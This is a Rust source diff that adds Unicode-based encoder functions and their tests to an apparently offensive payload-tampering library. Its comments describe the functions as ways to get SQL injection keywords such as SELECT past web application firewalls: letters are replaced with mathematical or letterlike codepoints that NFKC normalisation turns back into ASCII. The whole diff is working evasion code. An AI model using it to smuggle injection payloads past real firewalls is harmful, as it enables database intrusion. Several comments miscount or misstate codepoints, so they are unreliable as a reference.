@@ -232,6 +232,159 @@ pub fn math_bold_encode(payload: &str) -> String {
     out
 }
 
+/// Mathematical Italic alphabet — same NFKC trick as `math_bold_encode`
+/// but in a different Unicode block (U+1D434 uppercase, U+1D44E
+/// lowercase). WAFs that have added detection for the bold range
+/// (U+1D400-) do not always cover italic.
+///
+/// One subtle gap: the math-italic block has a HOLE at U+1D455 where
+/// 'h' would have been (the letter 'h' was unified with U+210E PLANCK
+/// CONSTANT in an earlier Unicode revision). We substitute U+210E so
+/// the round-trip stays NFKC-correct.
+///
+/// Reference: https://ibrahimsql.com/posts/waf-bypass-unicode
+#[must_use]
+pub fn math_italic_encode(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 4);
+    for ch in payload.chars() {
+        let mapped = match ch {
+            'A'..='Z' => char::from_u32(0x1D434 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
+            'h' => '\u{210E}', // hole at U+1D455; use PLANCK CONSTANT
+            'a'..='z' => char::from_u32(0x1D44E + (ch as u32 - 'a' as u32)).unwrap_or(ch),
+            c => c,
+        };
+        out.push(mapped);
+    }
+    out
+}
+
+/// Mathematical Script alphabet — uppercase U+1D49C, lowercase U+1D4B6.
+/// Script has SIX holes (U+1D49D B, U+1D4A0 E, U+1D4A1 F, U+1D4A3 H,
+/// U+1D4A4 I, U+1D4A7 M, U+1D4AD R, U+1D4BA e, U+1D4BC g, U+1D4C4 o)
+/// — each filled by the letterlike-symbols block (U+212C BCRIPT
+/// CAPITAL B, U+2130 SCRIPT CAPITAL E, etc.) so the encoded string
+/// stays NFKC-equivalent to ASCII.
+#[must_use]
+pub fn math_script_encode(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 4);
+    for ch in payload.chars() {
+        let mapped = match ch {
+            'B' => '\u{212C}',
+            'E' => '\u{2130}',
+            'F' => '\u{2131}',
+            'H' => '\u{210B}',
+            'I' => '\u{2110}',
+            'L' => '\u{2112}',
+            'M' => '\u{2133}',
+            'R' => '\u{211B}',
+            'A'..='Z' => char::from_u32(0x1D49C + (ch as u32 - 'A' as u32)).unwrap_or(ch),
+            'e' => '\u{212F}',
+            'g' => '\u{210A}',
+            'o' => '\u{2134}',
+            'a'..='z' => char::from_u32(0x1D4B6 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
+            c => c,
+        };
+        out.push(mapped);
+    }
+    out
+}
+
+/// Mathematical Fraktur (blackletter) alphabet — uppercase U+1D504,
+/// lowercase U+1D51E. Fraktur has holes at C/H/I/R/Z which are filled
+/// by U+212D ℭ, U+210C ℌ, U+2111 ℑ, U+211C ℜ, U+2128 ℨ.
+#[must_use]
+pub fn math_fraktur_encode(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 4);
+    for ch in payload.chars() {
+        let mapped = match ch {
+            'C' => '\u{212D}',
+            'H' => '\u{210C}',
+            'I' => '\u{2111}',
+            'R' => '\u{211C}',
+            'Z' => '\u{2128}',
+            'A'..='Z' => char::from_u32(0x1D504 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
+            'a'..='z' => char::from_u32(0x1D51E + (ch as u32 - 'a' as u32)).unwrap_or(ch),
+            c => c,
+        };
+        out.push(mapped);
+    }
+    out
+}
+
+/// Mathematical Double-Struck (blackboard bold) alphabet — uppercase
+/// U+1D538, lowercase U+1D552. Holes at C/H/N/P/Q/R/Z filled from
+/// the letterlike-symbols block.
+#[must_use]
+pub fn math_double_struck_encode(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 4);
+    for ch in payload.chars() {
+        let mapped = match ch {
+            'C' => '\u{2102}',
+            'H' => '\u{210D}',
+            'N' => '\u{2115}',
+            'P' => '\u{2119}',
+            'Q' => '\u{211A}',
+            'R' => '\u{211D}',
+            'Z' => '\u{2124}',
+            'A'..='Z' => char::from_u32(0x1D538 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
+            'a'..='z' => char::from_u32(0x1D552 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
+            // Double-struck digits (U+1D7D8).
+            '0'..='9' => char::from_u32(0x1D7D8 + (ch as u32 - '0' as u32)).unwrap_or(ch),
+            c => c,
+        };
+        out.push(mapped);
+    }
+    out
+}
+
+/// Letterlike-symbols + circled-Latin selective substitution — replaces
+/// individual ASCII letters in the payload with codepoints from
+/// U+2100-214F and U+24B6-24E9 that NFKC-normalize back to the original
+/// ASCII letter. Unlike the math-*-encode functions which substitute
+/// every letter from a single block, this picks the most visually-
+/// distinct codepoint per letter to maximise WAF-rule mismatch while
+/// keeping the encoded string visibly identifiable.
+///
+/// The HackerNoon-documented `ŚεℒℇℂƮ` payload is essentially this
+/// function applied to the SQL keyword `SELECT` — backend's NFKC casts
+/// it to `SELECT` and executes; the WAF's signature regex sees an
+/// unrecognized codepoint sequence.
+#[must_use]
+pub fn letterlike_encode(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 4);
+    for ch in payload.chars() {
+        let mapped = match ch {
+            // Letterlike-symbols block (U+2100-214F).
+            'B' => '\u{212C}', // SCRIPT CAPITAL B → B
+            'C' => '\u{2102}', // DOUBLE-STRUCK CAPITAL C → C
+            'E' => '\u{2130}', // SCRIPT CAPITAL E → E
+            'F' => '\u{2131}', // SCRIPT CAPITAL F → F
+            'H' => '\u{210B}', // SCRIPT CAPITAL H → H
+            'I' => '\u{2110}', // SCRIPT CAPITAL I → I
+            'L' => '\u{2112}', // SCRIPT CAPITAL L → L
+            'M' => '\u{2133}', // SCRIPT CAPITAL M → M
+            'N' => '\u{2115}', // DOUBLE-STRUCK CAPITAL N → N
+            'P' => '\u{2119}', // DOUBLE-STRUCK CAPITAL P → P
+            'Q' => '\u{211A}', // DOUBLE-STRUCK CAPITAL Q → Q
+            'R' => '\u{211D}', // DOUBLE-STRUCK CAPITAL R → R
+            'Z' => '\u{2124}', // DOUBLE-STRUCK CAPITAL Z → Z
+            // Kelvin K (U+212A) and Angstrom Å (U+212B) NFKC-normalise.
+            'K' => '\u{212A}',
+            'e' => '\u{212F}', // SCRIPT SMALL E
+            'g' => '\u{210A}', // SCRIPT SMALL G
+            'o' => '\u{2134}', // SCRIPT SMALL O
+            // Falling back to circled-Latin for letters without
+            // letterlike-symbol equivalents. NFKC strips the circle
+            // and yields the bare letter.
+            'A'..='Z' => char::from_u32(0x24B6 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
+            'a'..='z' => char::from_u32(0x24D0 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
+            c => c,
+        };
+        out.push(mapped);
+    }
+    out
+}
+
 /// SQL string-literal CONCAT splitter — converts every single-quoted string
 /// in the payload to a `CONCAT('a','b',...)` expression with one char per
 /// argument.
@@ -1014,6 +1167,109 @@ mod tests {
     #[test]
     fn math_bold_encode_empty() {
         assert_eq!(math_bold_encode(""), "");
+    }
+
+    // ── math_italic / script / fraktur / double_struck tests ────────────
+
+    #[test]
+    fn math_italic_encode_uppercase() {
+        assert_eq!(math_italic_encode("A"), "\u{1D434}"); // 𝐴
+        assert_eq!(math_italic_encode("Z"), "\u{1D44D}"); // 𝑍
+    }
+
+    #[test]
+    fn math_italic_encode_handles_h_hole() {
+        // U+1D455 is reserved (the hole); we substitute U+210E.
+        assert_eq!(math_italic_encode("h"), "\u{210E}");
+    }
+
+    #[test]
+    fn math_italic_encode_is_distinct_from_bold() {
+        assert_ne!(math_italic_encode("SELECT"), math_bold_encode("SELECT"));
+    }
+
+    #[test]
+    fn math_script_encode_fills_all_holes() {
+        // Every uppercase letter must map to SOMETHING (no panic, no
+        // fall-through to ASCII).
+        for c in 'A'..='Z' {
+            let s: String = c.to_string();
+            let enc = math_script_encode(&s);
+            assert!(
+                enc != s,
+                "math_script_encode left {c} unchanged — hole not filled"
+            );
+        }
+    }
+
+    #[test]
+    fn math_fraktur_encode_fills_chizr_holes() {
+        for c in &['C', 'H', 'I', 'R', 'Z'] {
+            let s: String = c.to_string();
+            assert!(
+                math_fraktur_encode(&s) != s,
+                "math_fraktur_encode left {c} unchanged"
+            );
+        }
+    }
+
+    #[test]
+    fn math_double_struck_encode_digits_distinct_from_bold() {
+        // double-struck 0 = U+1D7D8 ≠ bold 0 = U+1D7CE
+        assert_ne!(math_double_struck_encode("0"), math_bold_encode("0"));
+    }
+
+    #[test]
+    fn math_double_struck_encode_fills_letter_holes() {
+        for c in &['C', 'H', 'N', 'P', 'Q', 'R', 'Z'] {
+            let s: String = c.to_string();
+            assert!(math_double_struck_encode(&s) != s);
+        }
+    }
+
+    #[test]
+    fn letterlike_encode_select_payload_uses_letterlike_block() {
+        let encoded = letterlike_encode("SELECT");
+        // L → U+2112 SCRIPT CAPITAL L (the headline letterlike sub).
+        assert!(encoded.contains('\u{2112}'));
+        // S has no letterlike-block equivalent; falls back to circled
+        // Latin (U+24CE).
+        assert!(encoded.chars().any(|c| c as u32 >= 0x24B6 && c as u32 <= 0x24E9));
+    }
+
+    #[test]
+    fn letterlike_encode_preserves_non_letters() {
+        assert_eq!(letterlike_encode(" ' = "), " ' = ");
+    }
+
+    #[test]
+    fn all_new_encoders_preserve_pure_punctuation() {
+        // Pure punctuation — no letters, no digits — must round-trip
+        // through every encoder unchanged. (Digits ARE transformed
+        // by math_double_struck_encode, so we exclude them.)
+        for f in [
+            math_italic_encode,
+            math_script_encode,
+            math_fraktur_encode,
+            math_double_struck_encode,
+            letterlike_encode,
+        ] {
+            assert_eq!(f("' = -- /* */ ;"), "' = -- /* */ ;");
+        }
+    }
+
+    #[test]
+    fn all_new_encoders_distinct_from_each_other() {
+        let s = "SELECT";
+        let bold = math_bold_encode(s);
+        let italic = math_italic_encode(s);
+        let script = math_script_encode(s);
+        let fraktur = math_fraktur_encode(s);
+        let dstruck = math_double_struck_encode(s);
+        let letter = letterlike_encode(s);
+        let outputs = [bold, italic, script, fraktur, dstruck, letter];
+        let set: std::collections::BTreeSet<&String> = outputs.iter().collect();
+        assert_eq!(set.len(), outputs.len(), "two encoders produced identical output");
     }
 
     // ── sql_concat_split tests ─────────────────────────────────────────
